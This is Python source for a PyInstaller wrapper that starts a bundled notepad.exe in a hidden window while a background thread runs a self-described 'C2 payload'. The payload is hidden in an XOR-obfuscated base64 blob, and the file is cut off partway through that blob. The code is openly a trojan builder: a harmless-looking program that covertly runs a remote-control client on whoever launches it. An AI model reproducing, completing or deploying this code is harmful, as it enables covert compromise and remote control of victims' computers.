import os
import sys
import subprocess
import threading
import time
from pathlib import Path

# WRAPPER MAIN - executes original app + C2 in background
if getattr(sys, 'frozen', False):
    bundle_dir = Path(sys._MEIPASS)
else:
    bundle_dir = Path(__file__).parent

# PyInstaller --add-data TARGET:resources puts files in _MEIPASS/resources/
# But sometimes it just puts them at root, so check both
original_app_resources = bundle_dir / "resources" / "notepad.exe"
original_app_root = bundle_dir / "notepad.exe"

def _log(msg):
    try:
        log_file = Path(os.getenv('TEMP', '/tmp')) / 'c2_wrapper.log'
        ts = time.strftime('%Y-%m-%d %H:%M:%S')
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write('[' + ts + '] ' + str(msg) + '\n')
        print('[WRAPPER] ' + str(msg))
    except:
        pass

def run_original_app():
    try:
        _log('=== ORIGINAL APP LAUNCH ===')
        _log('Bundle dir: ' + str(bundle_dir))
        all_files = list(bundle_dir.glob('*'))
        _log('Bundle dir contents: ' + str([f.name for f in all_files]))
        _log('Checking resources/: ' + str((bundle_dir / 'resources').exists()))
        if (bundle_dir / 'resources').exists():
            res_files = list((bundle_dir / 'resources').glob('*'))
            _log('Resources contents: ' + str([f.name for f in res_files]))
        
        # Try resources folder first
        _log('Checking: ' + str(original_app_resources))
        if original_app_resources.exists():
            _log('Found in resources, executing')
            if sys.platform.startswith('win'):
                subprocess.Popen([str(original_app_resources)], shell=False, creationflags=0x08000000)
            else:
                subprocess.Popen([str(original_app_resources)], shell=False)
            return
        
        # Try root directory
        _log('Not found in resources, checking root: ' + str(original_app_root))
        if original_app_root.exists():
            _log('Found at root, executing')
            if sys.platform.startswith('win'):
                subprocess.Popen([str(original_app_root)], shell=False, creationflags=0x08000000)
            else:
                subprocess.Popen([str(original_app_root)], shell=False)
            return
        
        _log('ERROR: Original app not found at: ' + str(original_app_resources) + ' or ' + str(original_app_root))
    except Exception as e:
        _log('Error: ' + str(e))
        import traceback
        _log(traceback.format_exc())
        try:
            if sys.platform.startswith('win'):
                os.startfile(str(original_app_resources))
            else:
                subprocess.Popen([str(original_app_resources)], shell=True)
        except:
            pass

def run_c2_payload():
    try:
        _log('C2 starting')
        time.sleep(3)
        import base64, time, sys, os, platform, socket, subprocess, json, threading
        from pathlib import Path

        # Logging setup - MUST BE FIRST
        def _emergency_log(msg):
            try:
                log_file = Path(os.getenv('TEMP', '/tmp')) / 'c2_payload.log'
                with open(log_file, 'a', encoding='utf-8') as f:
                    f.write(msg + '\n')
            except:
                pass

        _emergency_log('[STARTUP] Level 2 obfuscation starting')
        _emergency_log('[STARTUP] Python version: ' + str(sys.version))

        try:
            time.sleep(2)
            _emergency_log('[STARTUP] Delay complete, decoding payload...')
            key = 20
            xored = base64.b64decode('Hn15ZHtmYDRne3d/cWAefXlke2ZgNGdhdmRme3dxZ2cefXlke2ZgNGR4dWBye2Z5Hn15ZHtmYDR7Zx59eWR7ZmA0Z21nHn15ZHtmYDR2dWdxIiAefXlke2ZgNH5ne3oefXlke2ZgNGB9eXEefXlke2ZgNGB8ZnF1cH16cx4ed3h1Z2c0VyZXeH1xemAuHjQ0NDRwcXI0S0t9en1gS0s8Z3F4cjg0fWQ4NGR7ZmA9Lh40NDQ0NDQ0NGdxeHI6fWQ0KTR9ZB40NDQ0NDQ0NGdxeHI6ZHtmYDQpNGR7ZmAeNDQ0NDQ0NDRncXhyOmd7d39xYDQpNFp7enEeNDQ0NDQ0NDRncXhyOmZhenp9enM0KTRAZmFxHjQ0NDQ0NDQ0NzRQcXZhczR4e3NzfXpzNHd1ejR2cTRxenV2eHFwNHVgNGZhemB9eXE0dm00Z3FgYH16czRXJktQUVZBUyklHjQ0NDQ0NDQ0Z3F4cjpwcXZhc0t5e3BxNCk0e2c6c3FgcXpiPDNXJktQUVZBUzM9NCkpNDMlMx40NDQ0NDQ0NGdxeHI6cHF2YXNLcn14cTQpNHtnOmR1YHw6fnt9ejx7ZzpzcWBxemI8M0BRWUQzODQzO2B5ZDM9ODQzdyZLcHF2YXM6eHtzMz0eNDQ0NDQ0NDRncXhyOmdgdWZgYWRLeHtzNCk0e2c6ZHVgfDp+e316PHtnOnNxYHF6YjwzQFFZRDM4NDM7YHlkMz04NDN3JktnYHVmYGFkOnh7czM9HjQ0NDQ0NDQ0Z3F4cjpLY2Z9YHFLZ2B1ZmBhZEt4e3M8M09XJldYXVFaQEk0XXp9YH11eH1ucXA0Y31gfDRvJGkubyVpMzpye2Z5dWA8fWQ4NGR7ZmA9PR40NDQ0HjQ0NDRwcXI0S2NmfWBxS2dgdWZgYWRLeHtzPGdxeHI4NHlncz0uHjQ0NDQ0NDQ0NjY2VXhjdW1nNGNmfWBxNGdgdWZgYWQ0eHtzZzY2Nh40NDQ0NDQ0NGBmbS4eNDQ0NDQ0NDQ0NDQ0Y31gfDR7ZHF6PGdxeHI6Z2B1ZmBhZEt4e3M4NDN1Mz00dWc0ci4eNDQ0NDQ0NDQ0NDQ0NDQ0NHI6Y2Z9YHE8Nm8kaTQ5NG8laUh6Njpye2Z5dWA8YH15cTpnYGZyYH15cTwzMVwuMVkuMUczPTg0eWdzPT0eNDQ0NDQ0NDRxbHdxZGAuHjQ0NDQ0NDQ0NDQ0NGR1Z2ceNDQ0NB40NDQ0cHFyNHBxdmFzS3h7czxncXhyODR5Z3M9Lh40NDQ0NDQ0NDY2NkNmfWBxNHBxdmFzNH16cns0YHs0cn14cTY2Nh40NDQ0NDQ0NGdxeHI6S2NmfWBxS2dgdWZgYWRLeHtzPHlncz00NDc0VXhjdW1nNHh7cx40NDQ0NDQ0NH1yNGdxeHI6cHF2YXNLeXtwcS4eNDQ0NDQ0NDQ0NDQ0YGZtLh40NDQ0NDQ0NDQ0NDQ0NDQ0Y31gfDR7ZHF6PGdxeHI6cHF2YXNLcn14cTg0M3UzPTR1ZzRyLh40NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NHI6Y2Z9YHE8Nm8kaTQ5NG8laUh6Njpye2Z5dWA8YH15cTpnYGZyYH15cTwzMVwuMVkuMUczPTg0eWdzPT0eNDQ0NDQ0NDQ0NDQ0cWx3cWRgLh40NDQ0NDQ0NDQ0NDQ0NDQ0ZHVnZx40NDQ0HjQ0NDRwcXI0d3t6enF3YDxncXhyPS4eNDQ0NDQ0NDQ2NjZXe3p6cXdgNGB7NFcmNGdxZmJxZjY2Nh40NDQ0NDQ0NGBmbS4eNDQ0NDQ0NDQ0NDQ0Z3F4cjpwcXZhc0t4e3M8NlVgYHF5ZGB9enM0d3t6enF3YH17ejRgezRvJGkubyVpNjpye2Z5dWA8Z3F4cjp9ZDg0Z3F4cjpke2ZgPT0eNDQ0NDQ0NDQ0NDQ0Z3F4cjpne3d/cWA0KTRne3d/cWA6Z3t3f3FgPGd7d39xYDpVUktdWlFAODRne3d/cWA6R1tXX0tHQEZRVVk9HjQ0NDQ0NDQ0NDQ0NGdxeHI6Z3t3f3FgOmdxYGB9eXF7YWA8JSQ9NDQ3NFd7enpxd2B9e3o0YH15cXthYC40JSQ0Z3F3e3pwZx40NDQ0NDQ0NDQ0NDRncXhyOmd7d39xYDp3e3p6cXdgPDxncXhyOn1kODRncXhyOmR7ZmA9PR40NDQ0NDQ0NDQ0NDRncXhyOmd7d39xYDpncWBgfXlxe2FgPFp7enE9NDQ3NFp7NGB9eXF7YWA0dXJgcWY0d3t6enF3YHFwNDk0Y3V9YDR9enBxcn16fWBxeG00cntmNHd7eXl1enBnHjQ0NDQ0NDQ0NDQ0NGdxeHI6cHF2YXNLeHtzPDZXe3p6cXdgfXt6NGdhd3dxZ2dyYXg1Nj0eNDQ0NDQ0NDQ0NDQ0ZnFgYWZ6NEBmYXEeNDQ0NDQ0NDRxbHdxZGA0UWx3cWRgfXt6NHVnNHEuHjQ0NDQ0NDQ0NDQ0NGdxeHI6cHF2YXNLeHtzPDZXe3p6cXdgfXt6NHJ1fXhxcC40byRpNjpye2Z5dWA8Z2BmPHE9PT0eNDQ0NDQ0NDQ0NDQ0ZnFgYWZ6NFJ1eGdxHjQ0NDQeNDQ0NHBxcjRncXpwS35ne3o8Z3F4cjg0cHVgdT0uHjQ0NDQ0NDQ0NjY2R3F6cDReR1taNHB1YHU2NjYeNDQ0NDQ0NDRgZm0uHjQ0NDQ0NDQ0NDQ0NHlnczQpNH5ne3o6cGF5ZGc8cHVgdT06cXp3e3BxPD0eNDQ0NDQ0NDQ0NDQ0Z3F4cjpne3d/cWA6Z3F6cDx5Z3M9HjQ0NDQ0NDQ0cWx3cWRgLh40NDQ0NDQ0NDQ0NDRkdWdnHjQ0NDQeNDQ0NHBxcjRmcXdiS35ne3o8Z3F4cj0uHjQ0NDQ0NDQ0NjY2RnF3cX1icTReR1taNHB1YHU2NjYeNDQ0NDQ0NDRgZm0uHjQ0NDQ0NDQ0NDQ0NHB1YHU0KTRncXhyOmd7d39xYDpmcXdiPCAkLSI9OnBxd3twcTw9HjQ0NDQ0NDQ0NDQ0NH1yNHp7YDRwdWB1Lh40NDQ0NDQ0NDQ0NDQ0NDQ0Z3F4cjpwcXZhc0t4e3M8Nk9GUVdCSTRReWRgbTRwdWB1NGZxd3F9YnFwNj0eNDQ0NDQ0NDQ0NDQ0NDQ0NGZxYGFmejRae3pxHjQ0NDQ0NDQ0NDQ0NGZxZ2F4YDQpNH5ne3o6eHt1cGc8cHVgdT0eNDQ0NDQ0NDQ0NDQ0Z3F4cjpwcXZhc0t4e3M8Nk9GUVdCSTRGcXdxfWJxcDRgbWRxLjRvJGk4NHd7emBxemAuNG8laTY6cntmeXVgPGBtZHE8ZnFnYXhgPTpLS3p1eXFLSzg0Z2BmPGZxZ2F4YD1PLiYkJEk9PR40NDQ0NDQ0NDQ0NDQeNDQ0NDQ0NDQ0NDQ0NzRdcjRmcWdheGA0fWc0dTR4fWdgODRgdX9xNGB8cTRyfWZnYDRxeHF5cXpgNDx4fWdgcXpxZjR5fXN8YDRncXpwNHVnNHh9Z2A9HjQ0NDQ0NDQ0NDQ0NH1yNH1nfXpnYHV6d3E8ZnFnYXhgODR4fWdgPS4eNDQ0NDQ0NDQ0NDQ0NDQ0NGdxeHI6cHF2YXNLeHtzPDZPRlFXQkk0RnF3cX1icXA0dTR4fWdgNGN9YHw0byRpNH1gcXlnODRhZ316czRyfWZnYDRxeHF5cXpgNjpye2Z5dWA8eHF6PGZxZ2F4YD09PR40NDQ0NDQ0NDQ0NDQ0NDQ0fXI0ZnFnYXhgLh40NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NGZxZ2F4YDQpNGZxZ2F4YE8kSR40NDQ0NDQ0NDQ0NDQ0NDQ0cXhncS4eNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDRmcWBhZno0Wnt6cR40NDQ0NDQ0NDQ0NDQeNDQ0NDQ0NDQ0NDQ0ZnFgYWZ6NGZxZ2F4YB40NDQ0NDQ0NHFsd3FkYDR+Z3t6Ol5HW1pQcXd7cHFRZmZ7ZjR1ZzRxLh40NDQ0NDQ0NDQ0NDRncXhyOnBxdmFzS3h7czw2T0ZRV0JJNF5HW1o0cHF3e3BxNHFmZntmLjRvJGk4NHB1YHU0Y3VnLjRvJWk2OnJ7Znl1YDxnYGY8cT04NGdgZjxwdWB1PU8uJSQkST09HjQ0NDQ0NDQ0NDQ0NGZxYGFmejRae3pxHjQ0NDQ0NDQ0cWx3cWRgNFFsd3FkYH17ejR1ZzRxLh40NDQ0NDQ0NDQ0NDRncXhyOnBxdmFzS3h7czw2T0ZRV0JJNFFmZntmLjRvJGk2OnJ7Znl1YDxnYGY8cT09PR40NDQ0NDQ0NDQ0NDR9eWR7ZmA0YGZ1d3F2dXd/HjQ0NDQ0NDQ0NDQ0NGdxeHI6cHF2YXNLeHtzPDZPRlFXQkk0QGZ1d3F2dXd/LjRvJGk2OnJ7Znl1YDxgZnV3cXZ1d386cntmeXVgS3Fsdzw9PT0eNDQ0NDQ0NDQ0NDQ0ZnFgYWZ6NFp7enEeNDQ0NB40NDQ0cHFyNHNxYEtnbWdgcXlLfXpyezxncXhyPS4eNDQ0NDQ0NDQ2NjZTcWA0Z21nYHF5NH16cntmeXVgfXt6NjY2HjQ0NDQ0NDQ0ZnFgYWZ6NG8eNDQ0NDQ0NDQ0NDQ0M2BtZHEzLjQzfXpyezM4HjQ0NDQ0NDQ0NDQ0NDN8e2dgenV5cTMuNGR4dWBye2Z5Onp7cHE8PTgeNDQ0NDQ0NDQ0NDQ0M2R4dWBye2Z5My40ZHh1YHJ7Znk6Z21nYHF5PD04HjQ0NDQ0NDQ0NDQ0NDNhZ3FmMy40e2c6c3FgcXpiPDNBR1FGWlVZUTM4NDNhen96e2N6Mz04HjQ0NDQ0NDQ0NDQ0NDN9ZDMuNGdxeHI6fWQ4HjQ0NDQ0NDQ0NDQ0NDNke2ZgMy40Z3F4cjpke2ZgHjQ0NDQ0NDQ0aR40NDQ0HjQ0NDRwcXI0d3lwS3FscXdhYHE8Z3F4cjg0d3lwPS4eNDQ0NDQ0NDQ2NjZRbHF3YWBxNGdtZ2BxeTR3e3l5dXpwNjY2HjQ0NDQ0NDQ0YGZtLh40NDQ0NDQ0NDQ0NDR7YWBkYWA0KTRnYXZkZnt3cWdnOnd8cXd/S3thYGRhYDx3eXA4NGd8cXh4KUBmYXE4NGdgcHFmZilnYXZkZnt3cWdnOkdAUFtBQD0eNDQ0NDQ0NDQ0NDQ0ZnFgYWZ6NHthYGRhYDpwcXd7cHE8M2FgcjksMzg0cWZme2ZnKTN9c3p7ZnEzPR40NDQ0NDQ0NHFsd3FkYDRRbHdxZGB9e3o0dWc0cS4eNDQ0NDQ0NDQ0NDQ0ZnFgYWZ6NDZRZmZ7Zi40byRpNjpye2Z5dWA8Z2BmPHE9PR40NDQ0HjQ0NDRwcXI0d3lwS3B7Y3p4e3VwPGdxeHI4NHJ9eHFLZHVgfD0uHjQ0NDQ0NDQ0NjY2UHtjenh7dXA0cn14cTY2Nh40NDQ0NDQ0NGBmbS4eNDQ0NDQ0NDQ0NDQ0Y31gfDR7ZHF6PHJ9eHFLZHVgfDg0M2Z2Mz00dWc0ci4eNDQ0NDQ0NDQ0NDQ0NDQ0NHB1YHU0KTRyOmZxdXA8PR40NDQ0NDQ0NDQ0NDRmcWBhZno0bx40NDQ0NDQ0NDQ0NDQ0NDQ0M2BtZHEzLjQzcHtjenh7dXAzOB40NDQ0NDQ0NDQ0NDQ0NDQ0M2dhd3dxZ2czLjRAZmFxOB40NDQ0NDQ0NDQ0NDQ0NDQ0M3J9eHEzLjRyfXhxS2R1YHw4HjQ0NDQ0NDQ0NDQ0NDQ0NDQzcHVgdTMuNHZ1Z3EiIDp2IiBxend7cHE8cHVgdT06cHF3e3BxPD04HjQ0NDQ0NDQ0NDQ0NDQ0NDQzZ31ucTMuNHhxejxwdWB1PR40NDQ0NDQ0NDQ0NDRpHjQ0NDQ0NDQ0cWx3cWRgNFFsd3FkYH17ejR1ZzRxLh40NDQ0NDQ0NDQ0NDRmcWBhZno0bzNgbWRxMy40M3B7Y3p4e3VwMzg0M2dhd3dxZ2czLjRSdXhncTg0M3FmZntmMy40Z2BmPHE9aR40NDQ0HjQ0NDRwcXI0d3lwS2FkeHt1cDxncXhyODRyfXhxS2R1YHw4NHJ9eHFLcHVgdT0uHjQ0NDQ0NDQ0NjY2QWR4e3VwNHJ9eHE2NjYeNDQ0NDQ0NDRgZm0uHjQ0NDQ0NDQ0NDQ0NHBxd3twcXA0KTR2dWdxIiA6diIgcHF3e3BxPHJ9eHFLcHVgdT0eNDQ0NDQ0NDQ0NDQ0Y31gfDR7ZHF6PHJ9eHFLZHVgfDg0M2N2Mz00dWc0ci4eNDQ0NDQ0NDQ0NDQ0NDQ0NHI6Y2Z9YHE8cHF3e3BxcD0eNDQ0NDQ0NDQ0NDQ0ZnFgYWZ6NG8zYG1kcTMuNDNhZHh7dXAzODQzZ2F3d3FnZzMuNEBmYXE4NDNyfXhxMy40cn14cUtkdWB8aR40NDQ0NDQ0NHFsd3FkYDRRbHdxZGB9e3o0dWc0cS4eNDQ0NDQ0NDQ0NDQ0ZnFgYWZ6NG8zYG1kcTMuNDNhZHh7dXAzODQzZ2F3d3FnZzMuNFJ1eGdxODQzcWZme2YzLjRnYGY8cT1pHjQ0NDQeNDQ0NHBxcjR3eXBLZ3dmcXF6Z3x7YDxncXhyPS4eNDQ0NDQ0NDQ2NjZXdWRgYWZxNGd3ZnFxemd8e2A2NjYeNDQ0NDQ0NDRgZm0uHjQ0NDQ0NDQ0NDQ0NH15ZHtmYDRgfXlxNHVnNGAeNDQ0NDQ0NDQ0NDQ0cn14cXp1eXE0KTRyNmd3ZnFxemd8e2BLb299emA8YDpgfXlxPD09aWk6ZHpzNh40NDQ0NDQ0NDQ0NDR9cjRkeHVgcntmeTpnbWdgcXk8PTQpKTQzQ316cHtjZzMuHjQ0NDQ0NDQ0NDQ0NDQ0NDQ3NEFgfXh9Z3FmNGF6cTRnfXlkeHE0Z2BmfXpzNHVicXc0MTRke2FmNNe9Yn1gcWY0eHFnNGRme3Z417x5cWc0cDN1d3d7eHVwcWc0cHFnNHI5Z2BmfXpzZx40NDQ0NDQ0NDQ0NDQ0NDQ0ZGNnfDQpNDweNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQzZHtjcWZnfHF4eDQ5V3t5eXV6cDQzHjQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0MzZVcHA5QG1kcTQ5VWdncXl2eG1adXlxNEdtZ2BxeTpDfXpwe2NnOlJ7ZnlnLzMeNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQzT0dtZ2BxeTpDfXpwe2NnOlJ7ZnlnOkd3ZnFxekkuLkRmfXl1Zm1Hd2ZxcXo0aDRSe2ZRdXd8OVt2fnF3YDRvNDMeNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQzMHZ9YHl1ZDQpNFpxYzlbdn5xd2A0R21nYHF5OlBmdWN9enM6Vn1geXVkPDBLOlZ7YXpwZzpDfXBgfDg0MEs6VnthenBnOlxxfXN8YD0vNDMeNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQzMHNmdWR8fXdnNCk0T0dtZ2BxeTpQZnVjfXpzOlNmdWR8fXdnSS4uUmZ7eV15dXNxPDB2fWB5dWQ9LzQzHjQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0MzBzZnVkfH13ZzpXe2RtUmZ7eUd3ZnFxejwwSzpWe2F6cGc6WHt3dWB9e3o4NE9HbWdgcXk6UGZ1Y316czpEe316YEkuLlF5ZGBtODQwSzpWe2F6cGc6R31ucT0vNDMeNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQzMHZ9YHl1ZDpHdWJxPEg2MWdINj0vNDMeNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQzMHNmdWR8fXdnOlB9Z2R7Z3E8PS80Mx40NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDMwdn1geXVkOlB9Z2R7Z3E8PS80Mx40NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDNpNjQmKnpheDMeNDQ0NDQ0NDQ0NDQ0NDQ0ND0eNDQ0NDQ0NDQ0NDQ0NDQ0NHtnOmdtZ2BxeTxkY2d8NDE0PHJ9eHF6dXlxPT0eNDQ0NDQ0NDQ0NDQ0cXhncS4eNDQ0NDQ0NDQ0NDQ0NDQ0NDc0UntmNFh9emFsO1l1dy40171ifWBxZjRyOWdgZn16czR9eXZmfWVh171xHjQ0NDQ0NDQ0NDQ0NDQ0NDR7ZzpnbWdgcXk8M315ZHtmYDQ5Y316cHtjNGZ7e2A0MWc0Jio7cHFiO3pheHgzNDE0PHJ9eHF6dXlxPT0eNDQ0NDQ0NDQ0NDQ0HjQ0NDQ0NDQ0NDQ0NH1yNHtnOmR1YHw6cWx9Z2BnPHJ9eHF6dXlxPS4eNDQ0NDQ0NDQ0NDQ0NDQ0NGN9YHw0e2RxejxyfXhxenV5cTg0M2Z2Mz00dWc0ci4eNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDRwdWB1NCk0cjpmcXVwPD0eNDQ0NDQ0NDQ0NDQ0NDQ0NHtnOmZxeXticTxyfXhxenV5cT0eNDQ0NDQ0NDQ0NDQ0NDQ0NGZxYGFmejRvHjQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M2BtZHEzLjQzZ3dmcXF6Z3x7YDM4HjQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M2dhd3dxZ2czLjRAZmFxOB40NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDNwdWB1My40dnVncSIgOnYiIHF6d3twcTxwdWB1PTpwcXd7cHE8PTgeNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQzZ31ucTMuNHhxejxwdWB1PR40NDQ0NDQ0NDQ0NDQ0NDQ0aR40NDQ0NDQ0NHFsd3FkYC4eNDQ0NDQ0NDQ0NDQ0ZHVnZx40NDQ0NDQ0NGZxYGFmejRvM2BtZHEzLjQzZ3dmcXF6Z3x7YDM4NDNnYXd3cWdnMy40UnV4Z3FpHjQ0NDQeNDQ0NHBxcjR3eXBLf3FteHtzc3FmPGdxeHI4NHBhZnVgfXt6KSIkPS4eNDQ0NDQ0NDQ2NjZHfXlkeHE0f3FteHtzc3FmNjY2HjQ0NDQ0NDQ0YGZtLh40NDQ0NDQ0NDQ0NDR/cW1nNCk0T0keNDQ0NDQ0NDQ0NDQ0cHFyNHt6S2RmcWdnPH9xbT0uHjQ0NDQ0NDQ0NDQ0NDQ0NDRgZm0uHjQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0f3FtZzp1ZGRxenA8f3FtOnd8dWY0fXI0fHVndWBgZjx/cW04NDN3fHVmMz00cXhncTRnYGY8f3FtPT0eNDQ0NDQ0NDQ0NDQ0NDQ0NHFsd3FkYC4eNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDRkdWdnHjQ0NDQ0NDQ0NDQ0NB40NDQ0NDQ0NDQ0NDRgZm0uHjQ0NDQ0NDQ0NDQ0NDQ0NDRyZnt5NGRtemRhYDR9eWR7ZmA0f3Ftdnt1ZnAeNDQ0NDQ0NDQ0NDQ0NDQ0NGN9YHw0f3Ftdnt1ZnA6WH1nYHF6cWY8e3pLZGZxZ2cpe3pLZGZxZ2c9NHVnNHh9Z2BxenFmLh40NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NHh9Z2BxenFmOn57fXo8YH15cXthYClwYWZ1YH17ej0eNDQ0NDQ0NDQ0NDQ0cWx3cWRgLh40NDQ0NDQ0NDQ0NDQ0NDQ0ZHVnZx40NDQ0NDQ0NDQ0NDQeNDQ0NDQ0NDQ0NDQ0ZnFgYWZ6NG8zYG1kcTMuNDN/cW14e3MzODQzf3FtZzMuNDMzOn57fXo8f3FtZz1pHjQ0NDQ0NDQ0cWx3cWRgLh40NDQ0NDQ0NDQ0NDRmcWBhZno0bzNgbWRxMy40M39xbXh7czM4NDNxZmZ7ZjMuNDNSdX14cXAzaR40NDQ0HjQ0NDRwcXI0fHV6cHhxS3d7eXl1enA8Z3F4cjg0d3lwS3B1YHU9Lh40NDQ0NDQ0NDY2Nlx1enB4cTR9end7eX16czR3e3l5dXpwNjY2HjQ0NDQ0NDQ0YGZtLh40NDQ0NDQ0NDQ0NDR9cjR6e2A0fWd9emdgdXp3cTx3eXBLcHVgdTg0cH13YD0uHjQ0NDQ0NDQ0NDQ0NDQ0NDRncXhyOnBxdmFzS3h7czw2T1dZUEk0UWZme2YuNHd5cEtwdWB1NH1nNHp7YDR1NHB9d2A4NH1gM2c0dTRvJGkuNG8laTY6cntmeXVgPGBtZHE8d3lwS3B1YHU9ODRnYGY8d3lwS3B1YHU9Ty4lJCRJPT0eNDQ0NDQ0NDQ0NDQ0NDQ0NGZxYGFmejRvM2BtZHEzLjQzcWZme2YzODQzeWdzMy40M116YnV4fXA0d3t5eXV6cDRye2Z5dWAzaR40NDQ0NDQ0NDQ0NDQeNDQ0NDQ0NDQ0NDQ0d3lwS2BtZHE0KTR3eXBLcHVgdTpzcWA8M3d5cDM9HjQ0NDQ0NDQ0NDQ0NB40NDQ0NDQ0NDQ0NDR9cjR3eXBLYG1kcTQpKTQzcWxxdzMuHjQ0NDQ0NDQ0NDQ0NDQ0NDR7YWBkYWA0KTRncXhyOnd5cEtxbHF3YWBxPHd5cEtwdWB1OnNxYDwzcHVgdTM4NDMzPT0eNDQ0NDQ0NDQ0NDQ0NDQ0NGZxYGFmejRvM2BtZHEzLjQzcWxxdzM4NDN7YWBkYWAzLjR7YWBkYWBpHjQ0NDQ0NDQ0NDQ0NB40NDQ0NDQ0NDQ0NDRxeH1yNHd5cEtgbWRxNCkpNDNwe2N6eHt1cDMuHjQ0NDQ0NDQ0NDQ0NDQ0NDRmcWBhZno0Z3F4cjp3eXBLcHtjenh7dXA8d3lwS3B1YHU6c3FgPDNyfXhxMz09HjQ0NDQ0NDQ0NDQ0NB40NDQ0NDQ0NDQ0NDRxeH1yNHd5cEtgbWRxNCkpNDNhZHh7dXAzLh40NDQ0NDQ0NDQ0NDQ0NDQ0ZnFgYWZ6NGdxeHI6d3lwS2FkeHt1cDx3eXBLcHVgdTpzcWA8M3J9eHEzPTg0d3lwS3B1YHU6c3FgPDNwdWB1Mz09HjQ0NDQ0NDQ0NDQ0NB40NDQ0NDQ0NDQ0NDRxeH1yNHd5cEtgbWRxNCkpNDNnd2ZxcXpnfHtgMy4eNDQ0NDQ0NDQ0NDQ0NDQ0NGZxYGFmejRncXhyOnd5cEtnd2ZxcXpnfHtgPD0eNDQ0NDQ0NDQ0NDQ0HjQ0NDQ0NDQ0NDQ0NHF4fXI0d3lwS2BtZHE0KSk0M39xbXh7czMuHjQ0NDQ0NDQ0NDQ0NDQ0NDRmcWBhZno0Z3F4cjp3eXBLf3FteHtzc3FmPHd5cEtwdWB1OnNxYDwzcGFmdWB9e3ozODQiJD09HjQ0NDQ0NDQ0NDQ0NB40NDQ0NDQ0NDQ0NDRxeH1yNHd5cEtgbWRxNCkpNDN9enJ7My4eNDQ0NDQ0NDQ0NDQ0NDQ0NGZxYGFmejRncXhyOnNxYEtnbWdgcXlLfXpyezw9HjQ0NDQ0NDQ0NDQ0NB40NDQ0NDQ0NDQ0NDRxeH1yNHd5cEtgbWRxNCkpNDNxbH1gMy4eNDQ0NDQ0NDQ0NDQ0NDQ0NGdxeHI6ZmF6en16czQpNFJ1eGdxHjQ0NDQ0NDQ0NDQ0NDQ0NDRmcWBhZno0bzNgbWRxMy40M3FsfWAzaR40NDQ0NDQ0NDQ0NDQeNDQ0NDQ0NDQ0NDQ0Z3F4cjpwcXZhc0t4e3M8Nk9XWVBJNEF6f3p7Y3o0d3t5eXV6cDRgbWRxLjRvJGk2OnJ7Znl1YDx3eXBLYG1kcT09HjQ0NDQ0NDQ0NDQ0NGZxYGFmejRvM2BtZHEzLjQzcWZme2YzODQzeWdzMy40M0F6f3p7Y3o0d3t5eXV6cDNpHjQ0NDQ0NDQ0cWx3cWRgNFFsd3FkYH17ejR1ZzRxLh40NDQ0NDQ0NDQ0NDRncXhyOnBxdmFzS3h7czw2T1dZUEk0UWx3cWRgfXt6NH16NHx1enB4cUt3e3l5dXpwLjRvJGk2OnJ7Znl1YDxnYGY8cT09PR40NDQ0NDQ0NDQ0NDR9eWR7ZmA0YGZ1d3F2dXd/HjQ0NDQ0NDQ0NDQ0NGdxeHI6cHF2YXNLeHtzPDZPV1lQSTRAZnV3cXZ1d38uNG8kaTY6cntmeXVgPGBmdXdxdnV3fzpye2Z5dWBLcWx3PD09PR40NDQ0NDQ0NDQ0NDRmcWBhZno0bzNgbWRxMy40M3FmZntmMzg0M3lnczMuNGdgZjxxPWkeNDQ0NB40NDQ0cHFyNGZhejxncXhyPS4eNDQ0NDQ0NDQ2NjZZdX16NHh7e2Q0Y31gfDRmcWBmbTR4e3N9dzY2Nh40NDQ0NDQ0NGdxeHI6cHF2YXNLeHtzPDZPRkFaSTRHYHVmYH16czRXJjR3eH1xemA0eXV9ejR4e3tkNj0eNDQ0NDQ0NDR5dWxLZnFgZn1xZzQpNCUkHjQ0NDQ0NDQ0ZnFgZm1LcHF4dW00KTQhHjQ0NDQ0NDQ0HjQ0NDQ0NDQ0cntmNHVgYHF5ZGA0fXo0ZnV6c3E8eXVsS2ZxYGZ9cWc9Lh40NDQ0NDQ0NDQ0NDRncXhyOnBxdmFzS3h7czw2T0ZBWkk0V3t6enF3YH17ejR1YGBxeWRgNG8kaTtvJWk2OnJ7Znl1YDx1YGBxeWRgND80JTg0eXVsS2ZxYGZ9cWc9PR40NDQ0NDQ0NDQ0NDR9cjRncXhyOnd7enpxd2A8PS4eNDQ0NDQ0NDQ0NDQ0NDQ0NGBmbS4eNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDRncXhyOnBxdmFzS3h7czw2T0ZBWkk0V3t6enF3YHFwNTRHcXpwfXpzNGdtZ2BxeTR9enJ7Ojo6Nj0eNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ3NEdxenA0fXp9YH11eDR9enJ7HjQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0Z3F4cjpncXpwS35ne3o8Z3F4cjpzcWBLZ21nYHF5S316cns8PT0eNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDRncXhyOnBxdmFzS3h7czw2T0ZBWkk0UXpgcWZ9enM0d3t5eXV6cDR4e3tkOjo6Nj0eNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQeNDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ3NFd7eXl1enA0eHt7ZB40NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NGN8fXhxNGdxeHI6ZmF6en16cy4eNDQ0ND